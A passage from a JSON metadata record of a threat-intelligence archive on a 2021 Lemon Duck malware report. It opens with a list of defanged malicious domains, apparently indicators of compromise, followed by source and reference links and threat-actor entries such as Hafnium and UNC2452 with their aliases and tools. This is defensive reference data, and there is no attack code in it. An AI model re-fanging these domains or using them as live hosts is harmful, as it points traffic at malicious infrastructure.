post.\n\ndqIUHfNYL[.]kr\nvTr1RG2d9jQ[.]jp\nf56Ov2bn[.]cn\nzd0OVCFb[.]jp\neEy8QwB[.]jp\neiv0VGAD[.]cn\nXnxA8pv[.]jp\naV4Rq7lNZ[.]kr\nEMYDH4vzVK[.]cn\nQlhcXbC[.]kr\nRuesiAlJTCg[.]kr\nMua1s5tV[.]kr\nCUQmXrN2Ac[.]jp\nd2btrgUkxO[.]jp\ngktTpF[.]cn\nikKGVEgplC[.]kr\n9o6XVWm[.]kr\ng9Ve5b6T4[.]cn\n7M03nX[.]jp\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-07 - Lemon Duck spreads its wings- Actors target Microsoft Exchange servers, incorporate new TTPs.pdf"
    ],
    "report_names": [
        "2021-05-07 - Lemon Duck spreads its wings- Actors target Microsoft Exchange servers, incorporate new TTPs.pdf"
    ],
    "threat_actors": [
        {
            "id": "529c1ae9-4579-4245-86a6-20f4563a695d",
            "created_at": "2022-10-25T16:07:23.702006Z",
            "updated_at": "2025-03-27T02:02:09.93109Z",
            "deleted_at": null,
            "main_name": "Hafnium",
            "aliases": [
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "ETDA:Hafnium",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "70872c3a-e788-4b55-a7d6-b2df52001ad0",
            "created_at": "2023-01-06T13:46:39.18401Z",
            "updated_at": "2025-03-27T02:00:03.01553Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "DarkHalo",
                "StellarParticle",
                "NOBELIUM",
                "Solar Phoenix",
                "Midnight Blizzard"
            ],
            "source_name": "MISPGALAXY:UNC2452",
            "tools": [
                "SNOWYAMBER",
                "HALFRIG",
                "QUARTERRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7c969685-459b-4c93-a788-74108eab6f47",
            "created_at": "2023-01-06T13:46:39.189751Z",
            "updated_at": "2025-03-27T02:00:03.017103Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "ATK233",
                "G0125",
                "Operation Exchange Marauder",
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "MISPGALAXY:HAFNIUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2704d770-43b4-4bc4-8a5a-05df87416848",
            "created_at": "2022-10-25T15:50:23.306305Z",
            "updated_at": "2025-03-27T02:00:55.43633Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "HAFNIUM",
                "Operation Exchange Marauder",
                "Silk Typhoon"
            ],
            "source_name": "MITRE:HAFNIUM",
            "tools": [
                "Tarrask",
                "ASPXSpy",
                "Impacket",
                "PsExec",
                "China Chopper"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535566,
    "ts_updated_at": 1743041523,
    "ts_creation_date": 1653706062,
    "ts_modification_date": 1653706062,
    "files": {
        "pdf": "https://archive.orkl.eu/d79037245caf29210a161fbc4fda3b32dc687861.pdf",
        "text": "https://archive.orkl.eu/d79037245caf29210a161fbc4fda3b32dc687861.txt",
        "img": "https://archive.orkl.eu/d79037245caf29210a161fbc4fda3b32dc687861.jpg"
    }
}